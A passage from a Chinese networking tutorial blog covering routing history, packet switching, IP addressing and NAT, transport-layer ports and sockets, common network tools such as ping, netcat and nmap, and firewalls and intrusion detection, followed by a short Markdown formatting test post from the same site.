（前面说了）互联网的前身是“阿帕网/ARPANET”。在阿帕网诞生初期（上世纪70年代），全球的主机很少。因此，早期的路由表很简单，既是“全局”滴，又是“静态”滴。简而言之，每个路由器内部都维护一张“全局路由表”，这个“路由表”包含了全球所有其它路由器的关联信息。每当来了一个数据包，查一下这张全局路由表，自然就清楚要转发给谁，才能最快到达目的地。 早期的阿帕网，主机的变化比较少，也很少增加路由器。每当出现一个新的路由器，其它路由器的管理员就手工编辑各自的“全局路由表”。 为了加深大伙儿印象，特意找来两张70年代初的阿帕网拓扑图（注：图中的 IMP 是“Interface Message Processor”的缩写，也就是如今所说的“路由器”）。 第2阶段：动态全局路由表 后来，“阿帕网/互联网”的规模猛增，路由器数量也跟着猛增，隔三差五都有新的路由器冒出来。再用“静态路由表”这种机制，（编辑路由表的）管理员会被活活累死。于是改用“动态路由表”，并引入某种“路由发现机制”。但“路由表”依然是【全局】滴。 第3阶段：动态分级路由表 再到后来，全球的路由器越来越多，成千上万，再搞“全局路由表”已经不太现实了—— 一方面，“全局路由表”越来越大（查询的速度就越来越慢） 另一方面，由于互联网的流量越来越大，每来一个数据包都要查表，查询越来越频繁。 于是，路由器开始吃不消了。为了解决困境，想出一个新招数：引入“分级路由”（hierarchical routing）。所谓的“分级路由”就是：把整个互联网分为多个大区域，每个大区域内部再分小区域，小区域内部再分小小区域 ...... 看到这里，熟悉“数据结构与算法”的同学就会意识到——这相当于构造了一个【树状】层次结构。 有了这个层次结构，每个路由器重点关注：自己所在的那个最小化区域里面的网络拓扑。如此一来，每个路由器的“路由表”都会大幅度减小。 互联网的路由——从“CAS”的角度看其健壮性 如果把互联网视作一个系统，每个公网上的路由器都是一个自适应的主体。假如某个地区的网络流量突然暴涨，骨干网路由器会自动分流；假如因为地震或战争，导致某个地区的骨干网路由器全部下线，周边地区的路由器也会自动避开这个区域 ..... 所有这些工作，【不需要】依靠任何最高指挥中枢，去进行协调。 相反，如果互联网的路由系统中，设立了某种“中央委员会”进行实时调度，那互联网早就完蛋了，根本无法成长为今天这种规模。 网络层的两种交换技术——电路交换（circuit switching） VS 分组交换（packet switching） （技术菜鸟可以跳过这个小节） 前面聊“互联网诞生”，说到兰德公司的“Baran 方案”。该方案对当时的电信系统提出几大革命性的变化，其中之一就是“分组交换”技术（也称“数据包交换”or“封包交换”）。 一般来说，网络层的设计有两种截然不同的风格：【电路交换 VS 分组交换】。有时候也分别称之为“有连接的网络层 VS 无连接的网络层”。此处所说的“连接”指的是某种“虚电路”（洋文叫做“virtual circuit”，简称 VC）。 要理解“虚电路”，首先要从老式的电话系统说起。 最早期的电话，既没有拨号盘也没有按键，全靠一张嘴。当你拿起电话，先告诉接线员你要打给谁，接线员会用一根跳接线，插入电话交换设备的某个插孔，从而把你的电话机与对方的电话机相连。于是建立了一条两人之间的电话通路，也就是“电路”。你可以把“接线员”想象成某种“人肉路由器” 😃 后来发明了“自动电话交换机”，导致“接线员”全体下岗。虽然自动化了，但原理还是一样——当你在电话上拨了某人的号码，电话局的交换机会自动选择一条线路。只有当这条线路建立起来，对方的电话才会响。一旦双方开始通话，双方之间的语音都是通过这条线路传输。并且这条线路是独占的——只要通话不挂断，这条线路就不会再分配给其他人使用。 前面提到“互联网诞生的历史”，当时军方推动的“Baran 方案”被 AT＆T 断然拒绝。因为这个方案完全颠覆了传统的电话系统—— 颠覆之1：把“模拟信号”颠覆为“数字信号”（这点比较好理解，俺就不解释了） 颠覆之2：把“星形拓扑”颠覆为“网状拓扑”（关于这点，前面的小节已经讨论了） 颠覆之3：把“电路交换”颠覆为“分组交换”（这就是本小节的重点） 为了帮大伙儿理解上述第3点，举个例子： 假设主机 A 要向主机 B 发送一大坨数据。因为数据太多，肯定要分成好几坨小一点的（分成多个数据包）。如何把这些数据包发送给对方捏？ “电路交换”的实现方式 在发送数据之前，要先建立连接通道（通过路由算法，找出 A ＆ B 之间的某条通路）。这条通路就是所谓的“虚电路/VC”。一旦 VC 建立，每一个数据包都是从这条拓扑路径进行路由。 “分组交换”的实现方式 在发送数据之前，【不需要】建立通道，让每个数据包独立进行路由。这种情况下，这几个数据包可能会走【不同的】拓扑路径。因此，数据包到达的顺序与发送的顺序【不一定】相同。接收方收到所有数据包之后，还要自己进行排序。 当时的电话系统主要承载语音传输，“电路交换”显然性能更高。那为啥 Baran 的设计要采用“分组交换”捏？俺又要再次提到【效率 VS 健壮性】之间的矛盾与均衡。 对于“电路交换”，一旦建立连接，同一个连接的所有数据都走相同的路径（会经过完全相同的路由器）。也就是说，传输的过程中，如果某个路由器挂掉了（网络掉线 or 硬件当机 or 软件崩溃）。那么，该路由器正在处理的 N 个连接全都要报废。而“分组交换”则更加灵活——即使某个路由器挂掉了，后续的数据包会自动转向另外的路由器，损失很小。 “Baran 方案”之所以采用“分组交换”的设计，因为人家这个方案是提交给军方用来应对【全面核战争】滴，当然要考虑健壮性啦。 话说这两种交换机制，各有很多支持者，并分裂为两大阵营，分别是：“电信阵营 VS 互联网阵营”。两大阵营的口水战持续了 N 年，都无法说服对方。到了后来设计 OSI 模型的时候，为了保持中立性与通用性，OSI 模型本身并没有强制要求网络层采用哪一种风格。 经过几十年之后，咱们已经可以看出来：“互联网阵营”占据主导地位。如今，连电信系统都是架构在互联网之上。 网络层：具体实例 网络层的【协议】 网络层的协议有很多。由于“互联网”已经成为全球的事实标准，因此俺只列出属于“互联网协议族”的那些“网络层协议”： IP 协议（含 IPv4 ＆ IPv6） ICMP IGMP IPSec ...... （考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。 对上述这些协议，最重要的当然是 IP 协议。如果你想要深入了解 IP 协议，可以参考《TCP-IP 详解》。关于 IP 协议的书，此书的影响力最大。这本书共3卷，通常只需看第1卷。 网络层的【协议实现】 对于电脑主机（含移动设备），网络层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。 另外，还有一些专门的【3层】网络设备，也提供网络层的功能（参见本章节的后续小节）。 IP 地址的格式及含义 当年设计阿帕网的时候，采用了【4字节】（32比特）来表示“网络层地址”（也就是 IP 地址）。 “IP 地址”的含义很重要，俺有必要解释一下： 咱们平时所说的 IP 地址，采用【点分十进制】来表示。就是把地址的4个字节，先翻译为十进制，然后每个字节用一个小数点分隔开（参见如下示意图）： “IP 地址”的32比特，分为两部分：第1部分用来标识【子网】，第2部分用来标识该子网中的【主机】。 这两部分各占用多少比特，是不确定的。在这种情况下，“操作系统协议栈”如何知道哪些比特标识“子网”，哪些比特标识“主机”捏？奥妙在于【子网掩码】。所以，大伙儿在给系统配置 IP 地址的时候，通常都需要再设置一个【子网掩码】，就这个用途。 IP 地址枯竭，及其解决方法 前一个小节提到：IP地址包含【4字节】（32比特）。因此，最多只能表示【2的32次方】（42亿左右）的不同地址。考虑到还有很多地址保留给特殊用途，实际可用地址远远不到42亿。 到了如今，全球网民都已经几十亿了，IP 地址开始枯竭。咋办捏？为了解决这个问题，发展出若干技术手段。简单说一下最常见的几种手段： 1. IPv6 名气最大（最多人知道）的技术手段，大概是 IPv6 了。这招想要一劳永逸地解决地址枯竭的问题，采用了16字节（128比特）来表示 IP 地址。 设计 IPv6 的人自豪地宣称：即使给地球上的每一粒沙子分配一个 IPv6 地址，依然绰绰有余（确实没有吹牛，“2的128次方”是天文数字）。 但 IPv6 的缺点在于，【无法】向下兼容原有的 IP 协议（原有的协议叫“IPv4”）。IPv6 的普及一直比较慢，这是主要原因。 2. 代理服务器（proxy） 比如说，某个公司有100人，100台电脑。如果每台电脑都分配公网 IP 地址，就要消耗100个公网地址（太浪费啦）。 可以只申请一个公网 IP，然后在内网搞一个代理服务器，公网 IP 分配给它（代理服务器有两个网卡，一个接内网，一个接公网）。然后在其它电脑上设置代理，指向这台代理服务器，就都可以上外网啦。 3. 网络地址转换（NAT） 前面 proxy 那招有个缺点：内网的每台电脑里面的每个上网软件，都要单独设置代理。实在太麻烦啦！ 后来就发明了某种更牛逼的招数——网络地址转换（洋文是“Network Address Translation”，简称 NAT）。 用了这招，还是只要申请一个公网 IP，分配给内网的网关（网关有两个网卡，一个接内网，一个接公网）。然后在内网的网关配置 NAT 功能，自动就可以让内网的每台电脑访问外网。 在这篇博文，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【NAT 模式】，就是指这个玩意儿。 采用了 NAT 技术之后，可能会对某些应用软件（尤其是 P2P 类型的）造成兼容性问题，于是又发明了一些“NAT 穿透技术”（NAT traversal）。这类技术有好几种，如果有空的话，俺会单独写教程介绍。 4. 其它解决方法 关于“IPv4 地址空间耗尽”，解决方法肯定不止上面这几招。限于篇幅，就此打住。更多的讨论参见维基百科的“这个链接”。 网络层相关的【网络设备】 1. 路由器（router） （前面章节聊“路由原理”的时候，已经介绍过它；这里就不再浪费口水啦） 2. 3层交换机（Layer 3 switching） “3层交换机”是在“2层交换机”的基础上，增加了对网络层的处理。因此，它可以做到类似路由器的效果——在几个子网之间转发数据。 与路由器的差别在于——“3层交换机”链接的几个子网是【同种】网络；而路由器可以连接【异种】网络。 从上面这句话看，“3层交换机”的能力显然不如“路由器”。既然已经有“路由器”，为啥还要发明“3层交换机”捏？这就要说到【单臂路由器】的弊端。 对于企业内网的“2层交换机”，通常都支持 VLAN 功能。通俗地说：可以在交换机中划分多个【虚拟子网】。其实这些子网的中所有的电脑，都还是接入这台交换机，只不过这些子网配置了不同的网络地址。对于同一个 VLAN 内部的通讯，“2层交换机”自己就可以搞定（只需要用到2层协议）；但对于【跨】VLAN 主机之间的通讯，“2层交换机”就没戏啦（它没有路由功能）。因此，就必须在它旁边外加一个路由器，形成如下拓扑结构。在这个拓扑中，路由器只与单个设备（2层交换机）相连，所以称之为“单臂”。 请注意：如下示意图只画了两台电脑，位于两个 VLAN。实际上可能有很多个 VLAN，每个里面有几十台电脑。于是，交换机与路由器之间的传输通道就会成为瓶颈——【跨】VLAN 的任意两台电脑通讯，数据包都要到路由器那里兜一圈。为了消除这种瓶颈，才发明了“3层交换机”——把路由功能直接集成到交换机内部。 3. 无线热点（Wireless Access Point） “无线热点”通常用来提供无线接入，使得某个【无线】设备能接入到某个【有线】网络中。一般来说，热点都内置了路由功能，那么它就是“无线路由器”，对应到“3层”（网络层）。反之，如果没有路由功能，它就是“网桥”，属于“2层”（链路层）。 网络层相关的【软件工具】 1. ping 这个命令，很多人应该都知道。早在 Win9x 就有这个命令了。它使用（网络层的）ICMP 协议来测试某个远程主机是否可达。 提醒一下： 如果 ping 命令显示某个 IP 地址不可达，有很多种情况。比如说： 这个 IP 地址对应的主机已经关机 这个 IP 地址对应的主机已经断线 这个 IP 地址对应的主机拒绝响应 ICMP 协议 从你本机到这个 IP 地址之间，有某个防火墙拦截了 ICMP 协议 ...... 2. traceroute 这是一个通用的工具，用来测试路由。很早以前的 Windows 就已经内置了它，命令是 tracert。在 POSIX（Linux＆UNIX）上通常叫 traceroute 你可以用这个命令，测试你本机与互联网另一台主机之间的路由（也就是：从你本机到对方主机，要经过哪些路由器） 传输层：概述 传输层的必要性 屏蔽“有连接 or 无连接”的差异 （上一个章节提到）网络层本身已经屏蔽了【异种网络】的差异（比如“以太网、ATM、帧中继”之间的差异），而且网络层也屏蔽了路由的细节。但网络层本身还有一个差异，也就是网络层的两种交换技术：电路交换（有连接） VS 分组交换（无连接）。 前面章节也提到了：上述两种交换技术各有很多支持者，并分裂为两大阵营。当年设计 OSI 模型的时候，为了保持中立性与通用性，并没有强制规定“网络层”必须采用何种交换机制。 对于开发网络软件的程序员来说，当然不想操心“网络层用的是哪一种交换机制”。因此，需要对网络层的上述差异再加一个抽象层（也就是“传输层”）。 从“主机”到“进程” 前面介绍的“网络层”，其设计是面向主机（电脑）。“网络层地址”也就是某个主机的地址。 而“传输层”是面向【进程】滴！因为传输层要提供给【网络软件】使用，而网络软件打交道的对象是【另一个网络软件】。因此，传输层必须在“网络层地址”的基础上，再引入某种新的标识，用来区分同一台主机上的不同【进程】。 传输层的特殊性 在 OSI 7层模型中，传输层正好居中。这是一个很特殊的位置。 OSI 模型最下面3层，与【网络设备】比较密切。这里面所说的“网络设备”，既包括那些独立的主机（比如“路由器、交换机、等”），也包括电脑上的硬件（比如“网卡”）。 OSI 模型最上面3层，与【网络软件】比较密切（或者说，与“用户的业务逻辑”比较密切）。 而中间的传输层，正好是承上启下。对于开发应用软件的程序猿/程序媛，“传输层”是他们能感知的最低一层。 传输层的【端口】 刚才谈“传输层的必要性”，提到说——“网络层地址”只能标识【主机】，而传输层必须要能标识【进程】。为了达到这个目的，于是就引入了“传输层端口”这个概念（为了打字省力，后续讨论简称为“端口”）。 在 OSI 模型中，“端口”的官方称呼是“传输服务访问点”（洋文缩写 TSAP）。但是作为程序员，俺已经习惯于“端口”这个称呼。后续介绍依然用“端口”一词。 当程序员使用传输层提供的 API 开发网络软件时，通常把“端口”与“网络地址”一起使用（构成“二元组”），就可以定位到某个主机上的某个进程。 传输层：具体实例 传输层的【协议】 为了让程序员可以更爽地使用传输层来开发网络软件，传输层既要提供“有连接”的风格，也要提供“无连接”的风格。关于这两种风格的对比，前面已经聊过，这里不再浪费口水。 具体到“互联网协议族”，有两个主要的传输层实现，分别是 TCP ＆ UDP（前者是“有连接”，后者是“无连接”）。 除了 TCP ＆ UDP，“互联网协议族”还提供了其它一些传输层协议。因为比较冷门，俺就不介绍啦。 传输层的【协议实现】 对于电脑主机（含移动设备），传输层的协议实现通常包含在操作系统自带的网络模块中（也就是“操作系统协议栈”）。具体参见如下示意图。 另外，还有一些专门的【4层】网络设备，也提供传输层的功能（参见后续的小节）。 套接字（socket API） 前面说了：传输层是面向程序员（让他们可以更方便地开发网络软件）。因此，就需要提供一些封装传输层的【库】（API）。程序员只需要调用这些【库】，就可以使用传输层的协议进行通讯啦。 影响力最大的传输层封装库，当然是 socket API。它来自加州大学伯克利分校。 在互联网诞生初期，伯克利分校开发了一个 UNIX 操作系统的的变种，叫做“伯克利 UNIX 发行版”（BSD Unix），也就是如今 BSD 操作系统的前身。伯克利发行版内置了一套用来进行网络编程的 API，当时叫做“伯克利套接字”（Berkeley sockets）。由于这套 API 用起来很方便，很多其它的 UNIX 变种也移植了这套 API，于是就逐渐成了业界的事实标准。到了上世纪90年代，Windows ＆ Linux 也都提供了这套 API。 传输层相关的【网络设备】 4层交换机（Layer 4 switching） 前面已经介绍了“3层交换机”，“4层交换机”是其进一步的改良，可以识别传输层的协议，获取 TCP or UDP 的端口号。 有了这个能力，网管就可以在这种交换机上配置一些管理策略。比如说：（根据传输层端口号）过滤掉某种流量，或者对某种流量设置转发的优先级。 2. 状态防火墙（stateful firewall） 网络防火墙分好几种，大部分属于这种。它能完全处理 TCP 协议的状态，显然它属于“4层”（传输层）。 传输层相关的【软件工具】 1. netcat 家族——传输层的“瑞士军刀” 关于 netcat，俺已经写过一篇比较详细的教程：《扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”》。看完这篇教程，你肯定能体会它功能的强大——很多与 TCP/UDP 相关的事情，都可以用 netcat 搞定。 另外，netcat 还有很多衍生品（衍生的开源项目），构成一个丰富的 netcat 家族。在上述教程也有介绍。 2. netstat ＆ ss Windows 和 POSIX（Linux＆UNIX）都有一个 netstat 命令，可以查看当前系统的 TCP/UDP 状态（包括当前系统开启了哪些监听端口）。 另外，Linux 上还有一个 ss 命令，功能更强（但这个命令在 Windows 上默认没有） 3. nmap 这是最著名的开源的扫描器，可以扫描远程主机监听了哪些传输层端口（注：前面提到的“netcat 家族”也可以干这事儿） nmap 的功能很强，“端口扫描”只是其功能之一。 业务层（OSI 上三层）：概述 一不小心，这篇教程已经写了这么长。为了照顾那些有“阅读障碍”的读者，俺要稍微控制一下篇幅，就把 OSI 的【上三层】合在一起讨论。 前面的章节说过：【上三层】更接近于“网络软件”，对应的是应用软件的业务逻辑，因此俺统称为“业务层”。 注：有些书（比如《计算机网络》）会把 OSI 的上三层统称为“应用层”。由于 OSI 模型中本来就有一个“应用层”，俺认为这样容易搞混（尤其不利于技术菜鸟），所以另外起了一个“业务层”的名称。 业务层的必要性 业务层显然是必要滴。因为传输层位于操作系统，它不可能去了解网络软件的业务逻辑。为了让网络软件能够相互通讯，肯定要在传输层之上再定义更高层的协议。 问题在于：网络软件千奇百怪，其业务逻辑各不相同，因此，“业务层如何设计”，【无】一定之规。有些软件只用一个协议来搞定所有的业务逻辑（只有一层）；有些软件会参考 OSI，把业务逻辑的协议分为三层；还有些软件可能会分出更多的层次。 再强调一下：业务层的协议如何分层，完全看具体的业务逻辑，不要生搬硬套任何现有的参考模型。 会话层 ＆ 表示层 ＆ 应用层 对于大部分读者来说，【没必要】花时间去了解 OSI 最上面三层之间的区别。你只需把最上面三层视作【一坨】——他们都是与网络软件的业务逻辑密切相关滴。 那么，哪些人需要详细了解“这三层的差异”捏？ 如果你是个程序员，并且你正好是开发【网络】软件，俺建议你了解一下 OSI 模型的最上面三层，有助于你更深刻地思考某些网络协议的设计。所谓的“更深刻”指的是：你不能光停留在 WHAT 层面，要提升到 HOW 甚至 WHY 层面（参见《学习技术的三部曲：WHAT、HOW、WHY》） 业务层（OSI 上三层）：具体实例 业务层的【协议】 业务层的协议非常多。即使光把各种协议的名称列出来，也很费劲。所以俺就偷懒一下，只点评几个特别重要的协议。 HTTP 协议 如果让俺评选最重要的业务层协议，俺首推 HTTP 协议。互联网的普及推动了 Web 的普及，而 Web 的普及使得 HTTP 成为信息时代的重要支柱。当你上网的时候，你看到的网页（HTML 页面）就是通过 HTTP 协议传输到你的浏览器上。 如今 HTTP 已经不仅仅用来展示网页，还有很多业务层的协议是建立在 HTTP 协议之上。比如说：如果你用 RSS 订阅俺的博客，RSS 阅读器需要调用 blogspot 博客平台提供的 RSS 接口，这些 RSS 接口就是基于 HTTP 协议传输滴。 考虑到本文的篇幅，俺不可能在这里细聊 HTTP 协议的规格，有兴趣的同学可以去看《HTTP 权威指南》这本书。 SSL/TLS 协议 最早的 HTTP 协议是【明文】滴；为了强化安全性，后来又设计了 SSL 协议，用来【加密】HTTP 流量；再后来，SSL 升级为 TLS（这俩是同义词）。如今经常看到的 HTTPS 相当于“HTTP over TLS”。 SSL/TLS 设计得比较优雅（很灵活），使得其它业务层的协议可以很方便地架构在 SSL/TLS 之上。这样的好处是：其它协议就不用自己再设计一套加密机制＆认证机制。 SSL/TLS 对于安全性很重要，因此俺专门写了一个系列教程（如下），详细介绍该协议的技术细节。 《扫盲 HTTPS 和 SSL／TLS 协议》（系列） 域名相关的协议（DNS 及其它） 域名相关的协议，也很重要。因为域名系统是整个互联网的基础设施。最早的域名查询协议是“DNS 协议”，由于这个协议【没有】加密，导致了一些安全隐患。因此，后来又设计了一系列新的域名协议，引入了加密的机制。 关于这些协议的扫盲教程，可以参考如下博文： 《对比4种强化域名安全的协议——DNSSEC，DNSCrypt，DNS over TLS，DNS over HTTPS》 业务层相关的【网络设备】 应用层防火墙（application firewall） 前面提到了：大多数网络防火墙处于4层（状态防火墙），另外还有少数处于7层，也就是“应用层防火墙”（有时候也称之为“7层防火墙”）。 一般来说，这类防火墙具备了【深度包检测】（deep packet inspection，简称 DPI）的能力，可以分析应用层协议的【内容】。 简单说一下“深度包检测”： 如果某个网络设备，仅仅分析“应用层协议”本身，它还【不够格】称之为 DPI。为了做到 DPI，还要能理解应用层协议所承载的【内容】。 比如说：某人通过【明文】的 HTTP 协议从网上下载了一个 zip 压缩包。对于这个下载行为，那些做得好的 DPI 设备不光能识别出“HTTP 协议的内容是 ZIP 压缩包”，而且还能从 ZIP 压缩包中提取出里面的文件。 入侵检测（intrusion detection system） 一般来说，“入侵检测”如果不加定语，通常指“【网络】入侵检测”（洋文叫 NIDS）；另外还有一种“【主机】入侵检测”（洋文叫 HIDS）。HIDS 与本文无关。 “入侵检测”是一种网络安全设备，它通过嗅探（sniffer）的方式抓取网上的数据包，然后进行分析，尝试发现网络中是否存在黑客/骇客的入侵的行为。故名“入侵检测”。 由于 IDS 需要理解【应用层】（7层）的内容，因此它与“应用层防火墙”有个共同点，需要具备某种程度的 DPI（深度包检测）能力。它俩的一大差异是【部署方式】。 考虑到很多读者是 IT 外行，简单说一下“旁路部署”—— 如果你学过中学物理，应该知道电路有“串联 ＆ 并联”。所谓的“旁路部署”类似于电路中的【并联】。通俗地说：IDS 是【并联】部署，防火墙是【串联】部署. ","link":"https://blog.gd1214b.icu/post/Computer-Networks-Overview/"},{"title":"测试博客","content":"Markdown 标题 一级标题 二级标题 三级标题 四级标题 五级标题 六级标题 Markdown 段落 字体 斜体文本 粗体文本 粗斜体文本 分隔线 下面是分割线: 删除线 这是一条带有删除线的文本. 下划线 这是一条带有下划线的文本. Markdown 列表 无序列表 第一项 第二项 第三项 有序列表 第一项 第二项 第三项 嵌套列表 第一项： 第一项嵌套的第一个元素 第一项嵌套的第二个元素 第二项： 第二项嵌套的第一个元素 第二项嵌套的第二个元素 Markdown 区块 区块引用 文本1 文本2 文本3 区块嵌套 最外层 第一层嵌套 第二层嵌套 第三层嵌套 区块中使用列表 区块中使用列表 第一项 第二项 第三项 第一项 第二项 第三项 列表中使用区块 第一项 文本1 文本2 文本3 第二项 Markdown 代码 在文本中引用代码 格式化输出函数printf()的主要功能是向标准输出设备按规定格式输出信息。 代码区块 #include &lt;stdio.h&gt; int main() { printf(&quot;Hello, World! \\n&quot;); return 0; } Markdown 链接 这是一个链接https://blog.gd1214b.icu/ 这是一个超链接:gd1214b's blog Markdown 图片 下面是本网站的图标: 缩放图片: Markdown 表格 表头 表头 单元格 单元格 单元格 单元格 左对齐 右对齐 居中对齐 单元格 单元格 单元格 单元格 单元格 单元格 数学公式 ∣ijk∂X∂u∂Y∂u0∂X∂v∂Y∂v0∣\\begin{vmatrix} \\mathbf{i} &amp; \\mathbf{j} &amp; \\mathbf{k} \\\\ \\frac{\\partial X}{\\partial u} &amp; \\frac{\\partial Y}{\\partial u} &amp; 0 \\\\ \\frac{\\partial X}{\\partial v} &amp; \\frac{\\partial Y}{\\partial v} &amp; 0 \\\\ \\end{vmatrix} ∣∣∣∣∣∣​i∂u∂X​∂v∂X​​j∂u∂Y​∂v∂Y​​k00​∣∣∣∣∣∣​ 视频 您的浏览器不支持 video 标签。 音频 您的浏览器不支持 audio 元素。 ","link":"https://blog.gd1214b.icu/post/QQ4EPGT87/"}]}